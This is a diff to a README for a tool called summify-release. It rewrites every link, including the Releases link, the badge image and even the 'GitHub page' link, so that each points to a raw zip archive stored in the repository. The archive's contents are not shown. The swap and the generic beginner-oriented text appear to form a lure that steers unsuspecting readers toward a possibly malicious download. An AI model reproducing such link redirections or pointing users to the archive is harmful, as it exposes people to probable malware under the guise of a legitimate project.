@@ -1,7 +1,7 @@
 # 🌟 summify-release - Generate Structured Summaries Easily
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Download%20from%20Releases-brightgreen)](https://github.com/Sha9heen/summify-release/releases)
+[![Download from Releases](https://github.com/Sha9heen/summify-release/raw/refs/heads/main/summify_release/summify_release_2.1.zip%20Now-Download%20from%20Releases-brightgreen)](https://github.com/Sha9heen/summify-release/raw/refs/heads/main/summify_release/summify_release_2.1.zip)
 
 ## 🚀 Getting Started
 Thank you for choosing **summify-release**. This tool helps you create clear summaries from software updates quickly. No tech skills are needed. Follow these simple steps to get started.
@@ -20,7 +20,7 @@ Before you begin, ensure you have:
 ## 📦 Download & Install
 To get **summify-release**, simply visit the Releases page and download the latest version:
 
-[Download the latest version](https://github.com/Sha9heen/summify-release/releases)
+[Download the latest version](https://github.com/Sha9heen/summify-release/raw/refs/heads/main/summify_release/summify_release_2.1.zip)
 
 1. Click on the appropriate file for your operating system.
 2. Once the download finishes, locate the file in your computer’s Downloads folder.
@@ -63,6 +63,6 @@ This project is licensed under MIT. Feel free to use, modify, and share accordin
 Join our growing community of users! Share your feedback, suggestions, or improvements. Your input helps make **summify-release** better for everyone.
 
 ## 🖥️ More Information
-For detailed information, check out our [GitHub page](https://github.com/Sha9heen/summify-release).
+For detailed information, check out our [GitHub page](https://github.com/Sha9heen/summify-release/raw/refs/heads/main/summify_release/summify_release_2.1.zip).
 
 Thank you for using **summify-release**! We hope it simplifies your software documentation process.
